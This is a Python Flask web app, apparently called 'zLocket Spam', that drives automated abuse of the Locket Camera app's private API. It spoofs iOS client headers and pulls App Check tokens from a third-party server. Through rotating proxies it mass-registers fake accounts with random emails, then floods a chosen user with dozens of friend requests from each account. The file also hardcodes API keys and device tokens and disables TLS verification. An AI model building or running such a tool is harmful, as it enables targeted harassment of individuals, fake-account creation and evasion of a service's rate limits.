
from flask import Flask, render_template, request, jsonify, session
import threading
import time
import queue
import string
import random
import os
import sys
import subprocess
import json
import datetime
from queue import Queue
from itertools import cycle
from urllib.parse import urlparse, parse_qs, urlencode
import requests
import urllib3
from requests.exceptions import ProxyError
from colorama import init, Back, Style
from typing import Optional, List

# Import các class và function từ main.py
def _install_():
    try:
        from colorama import Fore, Style, init
        init()
    except ImportError:
        class DummyColors:
            def __getattr__(self, name):
                return ''
        Fore=Style=DummyColors()
    def itls(pkg):
        try:
            __import__(pkg)
            return True
        except ImportError:
            return False
    _list_={
        'requests': 'requests',
        'tqdm': 'tqdm',
        'colorama': 'colorama',
        'pystyle': 'pystyle',
        'urllib3': 'urllib3',
        'flask': 'flask',
    }
    _pkgs=[pkg_name for pkg_name in _list_ if not itls(pkg_name)]
    if _pkgs:
        print(f"{Fore.CYAN}{'=' * 50}{Style.RESET_ALL}")
        print(
            f"{Fore.YELLOW}[!] Bạn chưa có thư viện: {Fore.RED}{', '.join(_pkgs)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'=' * 50}{Style.RESET_ALL}")

        print(f"{Fore.BLUE}[*] Đang cài đặt thư viện...{Style.RESET_ALL}")
        try:
            subprocess.check_call(
                [sys.executable, '-m', 'pip', 'install', *_pkgs])
            print(f"{Fore.GREEN}[✓] Cài đặt thành công!{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(
                f"{Fore.RED}[✗] Lỗi cài đặt, hãy thử cài tay bằng lệnh sau:{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}pip install {' '.join(_pkgs)}{Style.RESET_ALL}")
            input("Nhấn Enter để thoát...")
            sys.exit(1)

_install_()

import re
from collections import defaultdict

app = Flask(__name__)
app.secret_key = 'zlocket_web_secret_key_2024'

# Global variables cho web app
user_sessions = {}  # Lưu session của từng user: {session_id: {tool_running, tool_thread, stop_event, config, last_spam_time}}
session_lock = threading.Lock()

PRINT_LOCK = threading.RLock()

def sfprint(*args, **kwargs):
    with PRINT_LOCK:
        print(*args, **kwargs)
        sys.stdout.flush()

class xColor:
    YELLOW='\033[38;2;255;223;15m'
    GREEN='\033[38;2;0;209;35m'
    RED='\033[38;2;255;0;0m'
    BLUE='\033[38;2;0;132;255m'
    PURPLE='\033[38;2;170;0;255m'
    PINK='\033[38;2;255;0;170m'
    MAGENTA='\033[38;2;255;0;255m'
    ORANGE='\033[38;2;255;132;0m'
    CYAN='\033[38;2;0;255;255m'
    PASTEL_YELLOW='\033[38;2;255;255;153m'
    PASTEL_GREEN='\033[38;2;153;255;153m'
    PASTEL_BLUE='\033[38;2;153;204;255m'
    PASTEL_PINK='\033[38;2;255;153;204m'
    PASTEL_PURPLE='\033[38;2;204;153;255m'
    DARK_RED='\033[38;2;139;0;0m'
    DARK_GREEN='\033[38;2;0;100;0m'
    DARK_BLUE='\033[38;2;0;0;139m'
    DARK_PURPLE='\033[38;2;75;0;130m'
    GOLD='\033[38;2;255;215;0m'
    SILVER='\033[38;2;192;192;192m'
    BRONZE='\033[38;2;205;127;50m'
    NEON_GREEN='\033[38;2;57;255;20m'
    NEON_PINK='\033[38;2;255;20;147m'
    NEON_BLUE='\033[38;2;31;81;255m'
    WHITE='\033[38;2;255;255;255m'
    RESET='\033[0m'

# Import zLocket class từ main.py
class zLocket:
    def __init__(self, device_token: str="", target_friend_uid: str="", num_threads: int=1, note_target: str=""):
        self.FIREBASE_GMPID="1:641029076083:ios:cc8eb46290d69b234fa606"
        self.IOS_BUNDLE_ID="com.locket.Locket"
        self.API_BASE_URL="https://api.locketcamera.com"
        self.FIREBASE_AUTH_URL="https://www.googleapis.com/identitytoolkit/v3/relyingparty"
        self.FIREBASE_API_KEY="AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        self.TOKEN_API_URL="https://thanhdieu.com/api/v1/locket/token"
        self.SHORT_URL="https://url.thanhdieu.com/api/v1"
        self.TOKEN_FILE_PATH="token.json"
        self.TOKEN_EXPIRY_TIME=(20 + 10) * 60
        self.FIREBASE_APP_CHECK=None
        self.USE_EMOJI=True
        self.ACCOUNTS_PER_PROXY=random.randint(6,10)
        self.NAME_TOOL="zLocket Spam BIGCHANG"
        self.VERSION_TOOL="v3.0.1"
        self.TARGET_FRIEND_UID=target_friend_uid if target_friend_uid else None
        self.PROXY_LIST=[
            # 'https://thanhdieu.com/api/list/free-proxy.txt',
        ]
        self.print_lock=threading.Lock()
        self.successful_requests=0
        self.failed_requests=0
        self.total_proxies=0
        self.start_time=time.time()
        self.spam_confirmed=False
        self.telegram='wus_team'
        self.author='WsThanhDieu'
        self.messages=[]
        self.request_timeout=15
        self.device_token=device_token
        self.num_threads=num_threads
        self.note_target=note_target
        self.session_id=int(time.time() * 1000)
        self._init_environment()
        self.FIREBASE_APP_CHECK=self._load_token_()

    def _print(self, *args, **kwargs):
        with PRINT_LOCK:
            timestamp=datetime.datetime.now().strftime("%H:%M:%S")
            message=" ".join(map(str, args))
            sfprint(f"[{timestamp}] {message}", **kwargs)

    def _loader_(self, message, duration=3):
        pass  # Simplified for web

    def _sequence_(self, message, duration=1.5, char_set="0123456789ABCDEF"):
        pass  # Simplified for web

    def _randchar_(self, duration=2):
        pass  # Simplified for web

    def _blinking_(self, text, blinks=3, delay=0.1):
        pass  # Simplified for web

    def _init_environment(self):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        init(autoreset=True)

    def _load_token_(self):
        try:
            if not os.path.exists(self.TOKEN_FILE_PATH):
                return self.fetch_token()
            with open(self.TOKEN_FILE_PATH, 'r') as file:
                token_data=json.load(file)
            if 'token' in token_data and 'expiry' in token_data:
                if token_data['expiry'] > time.time():
                    self._print(f"Loaded token from file: {token_data['token'][:10]}...")
                    return token_data['token']
                else:
                    self._print("Token expired, fetching new token")
            return self.fetch_token()
        except Exception as e:
            self._print(f"Error loading token: {str(e)}")
            return self.fetch_token()

    def save_token(self, token):
        try:
            token_data={
                'token': token,
                'expiry': time.time() + self.TOKEN_EXPIRY_TIME,
                'created_at': time.time()
            }
            with open(self.TOKEN_FILE_PATH, 'w') as file:
                json.dump(token_data, file, indent=4)
            self._print(f"Token saved to {self.TOKEN_FILE_PATH}")
            return True
        except Exception as e:
            self._print(f"Error saving token: {str(e)}")
            return False

    def fetch_token(self, retry=0, max_retries=3):
        if retry >= max_retries:
            self._print(f"Token acquisition failed after {max_retries} attempts")
            return None
        try:
            response=requests.get(self.TOKEN_API_URL, timeout=self.request_timeout, proxies={
                                    "http": None, "https": None})
            response.raise_for_status()
            data=response.json()
            if not isinstance(data, dict):
                time.sleep(0.5)
                return self.fetch_token(retry + 1)
            if data.get("code") == 200 and "data" in data and "token" in data["data"]:
                token=data["data"]["token"]
                self._print("Token acquired successfully")
                self.save_token(token)
                return token
            else:
                time.sleep(1.3)
                return self.fetch_token(retry + 1)
        except requests.exceptions.RequestException as e:
            self._print(f"Token request failed: {e}")
            time.sleep(1.3)
            return self.fetch_token(retry + 1)

    def headers_locket(self):
        return {
            'Host': 'api.locketcamera.com',
            'Accept': '*/*',
            'baggage': 'sentry-environment=production,sentry-public_key=78fa64317f434fd89d9cc728dd168f50,sentry-release=com.locket.Locket%401.121.1%2B1,sentry-trace_id=2cdda588ea0041ed93d052932b127a3e',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'sentry-trace': '2cdda588ea0041ed93d052932b127a3e-a3e2ba7a095d4f9d-0',
            'User-Agent': 'com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Firebase-Instance-ID-Token': 'd7ChZwJHhEtsluXwXxbjmj:APA91bFoMIgxwf-2tmY9QLy82lKMEWL6S4d8vb9ctY3JxLLTQB1k6312TcgtqJjWFhQVz_J4wIFvE0Kfroztu1vbZDOFc65s0vvj68lNJM4XuJg1onEODiBG3r7YGrQLiHkBV1gEoJ5f',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
        }

    def firebase_headers_locket(self):
        base_headers=self.headers_locket()
        return {
            'Host': 'www.googleapis.com',
            'baggage': base_headers.get('baggage', ''),
            'Accept': '*/*',
            'X-Client-Version': 'iOS/FirebaseSDK/10.23.1/FirebaseCore-iOS',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'X-Ios-Bundle-Identifier': self.IOS_BUNDLE_ID,
            'X-Firebase-GMPID': '1:641029076083:ios:cc8eb46290d69b234fa606',
            'X-Firebase-Client': 'H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA',
            'sentry-trace': base_headers.get('sentry-trace', ''),
            'Accept-Language': 'vi',
            'User-Agent': 'FirebaseAuth.iOS/10.23.1 com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Connection': 'keep-alive',
            'X-Firebase-GMPID': self.FIREBASE_GMPID,
            'Content-Type': 'application/json',
        }

    def excute(self, url, headers=None, payload=None, thread_id=None, step=None, proxies_dict=None):
        try:
            response=requests.post(
                url,
                headers=headers or self.headers_locket(),
                json=payload,
                proxies=proxies_dict,
                timeout=self.request_timeout,
                verify=False
            )
            response.raise_for_status()
            self.successful_requests+=1
            return response.json() if response.content else True
        except ProxyError:
            self.failed_requests+=1
            return "proxy_dead"
        except requests.exceptions.RequestException as e:
            self.failed_requests+=1
            if hasattr(e, 'response') and e.response is not None:
                status_code=e.response.status_code
                if status_code == 429:
                    return "too_many_requests"
            return None

    def _extract_uid_locket(self, url: str) -> Optional[str]:
        real_url=self._convert_url(url)
        if not real_url:
            self.messages.append("Locket account not found, please try again.")
            return None
        parsed_url=urlparse(real_url)
        if parsed_url.hostname != "locket.camera":
            self.messages.append(f"Locket URL không hợp lệ: {parsed_url.hostname}")
            return None
        if not parsed_url.path.startswith("/invites/"):
            self.messages.append(f"Link Locket Sai Định Dạng: {parsed_url.path}")
            return None
        parts=parsed_url.path.split("/")
        if len(parts) > 2:
            full_uid=parts[2]
            uid=full_uid[:28]
            return uid
        self.messages.append("Không tìm thấy UID trong Link Locket")
        return None

    def _convert_url(self, url: str) -> str:
        if url.startswith("https://locket.camera/invites/"):
            return url
        if url.startswith("https://locket.cam/"):
            try:
                resp=requests.get(
                    url,
                    headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
                    },
                    timeout=self.request_timeout,
                )
                if resp.status_code == 200:
                    match=re.search(r'window\.location\.href\s*=\s*"([^"]+)"', resp.text)
                    if match:
                        parsed=urlparse(match.group(1))
                        query=parse_qs(parsed.query)
                        enc_link=query.get("link", [None])[0]
                        if enc_link:
                            return enc_link
                        else:
                            return None
                    else:
                        return None
                else:
                    return None
            except Exception as e:
                self.messages.append("Failed to connect to the Locket server.")
                return ""
        payload={"type": "toLong", "kind": "url.thanhdieu.com", "url": url}
        headers={
            "Accept": "*/*",
            "Accept-Language": "vi",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
            "X-Requested-With": "XMLHttpRequest",
        }
        try:
            response=requests.post(
                self.SHORT_URL,
                headers=headers,
                data=urlencode(payload),
                timeout=self.request_timeout,
                verify=True,
            )
            response.raise_for_status()
            _res=response.json()
            if _res.get("status") == 1 and "url" in _res:
                return _res["url"]
            self.messages.append("Lỗi kết nối tới API Url.ThanhDieu.Com")
            return ""
        except:
            self.messages.append("Lỗi kết nối tới API Url.ThanhDieu.Com")
            return ""

# Helper functions
def _rand_str_(length=10, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))

def _rand_name_():
    return _rand_str_(8, chars=string.ascii_lowercase)

def _rand_email_():
    return f"{_rand_str_(15)}@thanhdieu.com"

def _rand_pw_():
    return 'zlocket' + _rand_str_(4)

def get_session_id():
    if 'session_id' not in session:
        session['session_id'] = _rand_str_(16)
    return session['session_id']

def get_user_session(session_id):
    with session_lock:
        if session_id not in user_sessions:
            user_sessions[session_id] = {
                'tool_running': False,
                'tool_thread': None,
                'stop_event': None,
                'config': None,
                'last_spam_time': 0,
                'status': {}
            }
        return user_sessions[session_id]

def cleanup_user_session(session_id):
    with session_lock:
        if session_id in user_sessions:
            user_session = user_sessions[session_id]
            user_session['tool_running'] = False
            user_session['tool_thread'] = None
            user_session['stop_event'] = None

def is_user_tool_running(session_id):
    user_session = get_user_session(session_id)
    return user_session['tool_running']

def set_user_tool_running(session_id, running):
    user_session = get_user_session(session_id)
    user_session['tool_running'] = running

# Import helper functions từ main.py
def load_proxies_for_user(user_config):
    proxies=[]
    proxy_urls=user_config.PROXY_LIST
    try:
        with open('proxy.txt', 'r', encoding='utf-8') as f:
            file_proxies=[line.strip() for line in f if line.strip()]
            proxies.extend(file_proxies)
    except FileNotFoundError:
        pass
    for url in proxy_urls:
        try:
            response=requests.get(url, timeout=user_config.request_timeout)
            response.raise_for_status()
            url_proxies=[line.strip() for line in response.text.splitlines() if line.strip()]
            proxies.extend(url_proxies)
        except:
            pass
    proxies=list(set(proxies))
    user_config.total_proxies=len(proxies)
    return proxies

def init_proxy_for_user(user_config):
    proxies = load_proxies_for_user(user_config)
    if not proxies:
        return [], 0
    random.shuffle(proxies)
    proxy_queue = Queue()
    for proxy in proxies:
        proxy_queue.put(proxy)
    num_threads = min(len(proxies), 20)
    return proxy_queue, num_threads

def format_proxy(proxy_str):
    if not proxy_str:
        return None
    try:
        if not proxy_str.startswith(('http://', 'https://')):
            proxy_str=f"http://{proxy_str}"
        return {"http": proxy_str, "https": proxy_str}
    except:
        return None

def get_proxy(proxy_queue, thread_id, stop_event=None):
    try:
        if stop_event is not None and stop_event.is_set():
            return None
        proxy_str=proxy_queue.get_nowait()
        return proxy_str
    except queue.Empty:
        return None

def step1b_sign_in_for_user(email, password, thread_id, proxies_dict, user_config):
    if not email or not password:
        return None
    payload={
        "email": email,
        "password": password,
        "clientType": "CLIENT_TYPE_IOS",
        "returnSecureToken": True
    }
    vtd=user_config.excute(
        f"{user_config.FIREBASE_AUTH_URL}/verifyPassword?key={user_config.FIREBASE_API_KEY}",
        headers=user_config.firebase_headers_locket(),
        payload=payload,
        thread_id=thread_id,
        step="Auth",
        proxies_dict=proxies_dict
    )
    if vtd and 'idToken' in vtd:
        return vtd.get('idToken')
    return None

def step2_finalize_user_for_user(id_token, thread_id, proxies_dict, user_config):
    if not id_token:
        return False
    first_name=user_config.NAME_TOOL
    last_name=' '.join(random.sample([
        '😀', '😂', '😍', '🥰', '😊', '😇', '😚', '😘', '😻', '😽', '🤗',
        '😎', '🥳', '😜', '🤩', '😢', '😡', '😴', '🙈', '🙌', '💖', '🔥', '👍',
        '✨', '🌟', '🍎', '🍕', '🚀', '🎉', '🎈', '🌈', '🐶', '🐱', '🦁'
    ], 5))
    username=_rand_name_()
    payload={
        "data": {
            "username": username,
            "last_name": last_name,
            "require_username": True,
            "first_name": first_name
        }
    }
    headers=user_config.headers_locket()
    headers['Authorization']=f"Bearer {id_token}"
    result=user_config.excute(
        f"{user_config.API_BASE_URL}/finalizeTemporaryUser",
        headers=headers,
        payload=payload,
        thread_id=thread_id,
        step="Profile",
        proxies_dict=proxies_dict
    )
    return bool(result)

def step3_send_friend_request_for_user(id_token, thread_id, proxies_dict, user_config):
    if not id_token:
        return False
    payload={
        "data": {
            "user_uid": user_config.TARGET_FRIEND_UID,
            "source": "signUp",
            "platform": "iOS",
            "messenger": "Messages",
            "invite_variant": {"value": "1002", "@type": "type.googleapis.com/google.protobuf.Int64Value"},
            "share_history_eligible": True,
            "rollcall": False,
            "prompted_reengagement": False,
            "create_ofr_for_temp_users": False,
            "get_reengagement_status": False
        }
    }
    headers=user_config.headers_locket()
    headers['Authorization']=f"Bearer {id_token}"
    result=user_config.excute(
        f"{user_config.API_BASE_URL}/sendFriendRequest",
        headers=headers,
        payload=payload,
        thread_id=thread_id,
        step="Friend",
        proxies_dict=proxies_dict
    )
    return bool(result)

def step1_create_account_for_user(thread_id, proxy_queue, stop_event, user_config):
    while not stop_event.is_set():
        current_proxy=get_proxy(proxy_queue, thread_id, stop_event)
        proxies_dict=format_proxy(current_proxy)
        proxy_usage_count=0
        failed_attempts=0
        max_failed_attempts=10
        
        if not current_proxy or stop_event.is_set():
            break
            
        while not stop_event.is_set() and proxy_usage_count < user_config.ACCOUNTS_PER_PROXY and failed_attempts < max_failed_attempts:
            if stop_event.is_set():
                return
                
            email=_rand_email_()
            password=_rand_pw_()
            payload={
                "data": {
                    "email": email,
                    "password": password,
                    "client_email_verif": True,
                    "client_token": _rand_str_(40, chars=string.hexdigits.lower()),
                    "platform": "ios"
                }
            }
            
            response_data=user_config.excute(
                f"{user_config.API_BASE_URL}/createAccountWithEmailPassword",
                headers=user_config.headers_locket(),
                payload=payload,
                thread_id=thread_id,
                step="Register",
                proxies_dict=proxies_dict
            )
            
            if stop_event.is_set():
                return
                
            if response_data == "proxy_dead":
                current_proxy=None
                failed_attempts+=1
                continue
                
            if response_data == "too_many_requests":
                current_proxy=None
                failed_attempts+=1
                continue
                
            if isinstance(response_data, dict) and response_data.get('result', {}).get('status') == 200:
                proxy_usage_count+=1
                failed_attempts=0
                
                id_token=step1b_sign_in_for_user(email, password, thread_id, proxies_dict, user_config)
                if stop_event.is_set():
                    return
                    
                if id_token:
                    if step2_finalize_user_for_user(id_token, thread_id, proxies_dict, user_config):
                        if stop_event.is_set():
                            return
                        first_request_success=step3_send_friend_request_for_user(id_token, thread_id, proxies_dict, user_config)
                        if first_request_success:
                            for _ in range(50):
                                if stop_event.is_set():
                                    return
                                step3_send_friend_request_for_user(id_token, thread_id, proxies_dict, user_config)
            else:
                failed_attempts+=1

# Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_spam', methods=['POST'])
def start_spam():
    session_id = get_session_id()
    user_session = get_user_session(session_id)
    current_time = time.time()
    
    data = request.get_json()
    target = data.get('target', '').strip()
    custom_name = data.get('custom_name', '').strip()
    
    if not target:
        return jsonify({'success': False, 'message': 'Vui lòng nhập target!'})
    
    # Kiểm tra cooldown
    if user_session['last_spam_time'] > 0:
        time_since_last = current_time - user_session['last_spam_time']
        if time_since_last < 60:
            remaining = int(60 - time_since_last)
            return jsonify({'success': False, 'message': f'Vui lòng đợi {remaining} giây nữa để có thể spam tiếp!'})
    
    if is_user_tool_running(session_id):
        return jsonify({'success': False, 'message': 'Tool đang chạy! Vui lòng dừng trước khi bắt đầu mới.'})
    
    # Xử lý custom name
    if not custom_name or custom_name.lower() == 'default':
        custom_name = "zLocket Spam BIGCHANG"
    elif len(custom_name) > 30:
        return jsonify({'success': False, 'message': 'Tên quá dài! Vui lòng nhập tên dưới 30 ký tự.'})
    
    # Khởi tạo config
    if not user_session['config']:
        user_session['config'] = zLocket()
    
    # Xử lý target URL
    url = target.strip()
    if not url.startswith(("http://", "https://")) and not url.startswith("locket."):
        url = f"https://locket.cam/{url}"
    if url.startswith("locket."):
        url = f"https://{url}"
    
    # Extract UID
    user_config = user_session['config']
    user_config.messages = []
    uid = user_config._extract_uid_locket(url)
    
    if not uid:
        error_msg = "Không thể lấy UID từ target. "
        for msg in user_config.messages:
            error_msg += msg + " "
        return jsonify({'success': False, 'message': error_msg.strip()})
    
    # Cấu hình
    user_config.TARGET_FRIEND_UID = uid
    user_config.NAME_TOOL = custom_name
    user_config.USE_EMOJI = True
    user_config.successful_requests = 0
    user_config.failed_requests = 0
    user_config.start_time = time.time()
    
    # Cập nhật thời gian spam cuối
    user_session['last_spam_time'] = current_time
    
    # Bắt đầu spam thread
    def run_spam():
        try:
            set_user_tool_running(session_id, True)
            user_session['stop_event'] = threading.Event()
            user_stop_event = user_session['stop_event']
            
            # Khởi tạo proxy
            proxy_queue, num_threads = init_proxy_for_user(user_config)
            num_threads = min(num_threads, 20)
            
            if num_threads == 0:
                user_session['status'] = {
                    'running': False,
                    'message': 'Không có proxy khả dụng!'
                }
                return
            
            user_session['status'] = {
                'running': True,
                'threads': num_threads,
                'target': uid,
                'name': custom_name,
                'start_time': time.time()
            }
            
            threads = []
            for i in range(num_threads):
                if not is_user_tool_running(session_id):
                    break
                thread = threading.Thread(
                    target=step1_create_account_for_user,
                    args=(i, proxy_queue, user_stop_event, user_config)
                )
                threads.append(thread)
                thread.daemon = True
                thread.start()
            
            # Chạy ít nhất 5 phút
            start_time = time.time()
            while time.time() - start_time < 300 and is_user_tool_running(session_id):
                time.sleep(1)
            
            # Dừng tool
            set_user_tool_running(session_id, False)
            user_stop_event.set()
            
            # Chờ threads dừng
            for thread in threads:
                thread.join(timeout=3)
            
            user_session['status']['running'] = False
            user_session['last_spam_time'] = time.time()
            
        except Exception as e:
            user_session['status'] = {
                'running': False,
                'message': f'Lỗi: {str(e)}'
            }
        finally:
            cleanup_user_session(session_id)
            user_session['last_spam_time'] = time.time()
    
    user_session['tool_thread'] = threading.Thread(target=run_spam)
    user_session['tool_thread'].start()
    
    return jsonify({
        'success': True, 
        'message': f'Đã bắt đầu spam! Target UID: {uid}, Custom Name: {custom_name}'
    })

@app.route('/stop_spam', methods=['POST'])
def stop_spam():
    session_id = get_session_id()
    user_session = get_user_session(session_id)
    
    if not is_user_tool_running(session_id):
        return jsonify({'success': False, 'message': 'Tool hiện không chạy.'})
    
    set_user_tool_running(session_id, False)
    if user_session['stop_event']:
        user_session['stop_event'].set()
    
    # Đợi tool thread dừng
    if user_session['tool_thread'] and user_session['tool_thread'].is_alive():
        user_session['tool_thread'].join(timeout=5)
    
    user_session['last_spam_time'] = time.time()
    cleanup_user_session(session_id)
    
    return jsonify({'success': True, 'message': 'Tool đã được dừng!'})

@app.route('/status')
def status():
    session_id = get_session_id()
    user_session = get_user_session(session_id)
    
    if not is_user_tool_running(session_id):
        return jsonify({
            'running': False,
            'message': 'Tool đang dừng'
        })
    
    if user_session['config']:
        elapsed = time.time() - user_session['config'].start_time
        success_rate = 0
        total_requests = user_session['config'].successful_requests + user_session['config'].failed_requests
        if total_requests > 0:
            success_rate = (user_session['config'].successful_requests / total_requests) * 100
        
        remaining_time = max(0, 300 - elapsed)
        
        return jsonify({
            'running': True,
            'elapsed': int(elapsed),
            'remaining': int(remaining_time),
            'success': user_session['config'].successful_requests,
            'failed': user_session['config'].failed_requests,
            'success_rate': round(success_rate, 1),
            'threads': user_session['status'].get('threads', 0),
            'target': user_session['config'].TARGET_FRIEND_UID,
            'name': user_session['config'].NAME_TOOL
        })
    
    return jsonify({
        'running': True,
        'message': 'Tool đang khởi động...'
    })

if __name__ == '__main__':
    print("🌐 Starting zLocket Web Interface...")
    print("🚀 Access the web interface at: http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
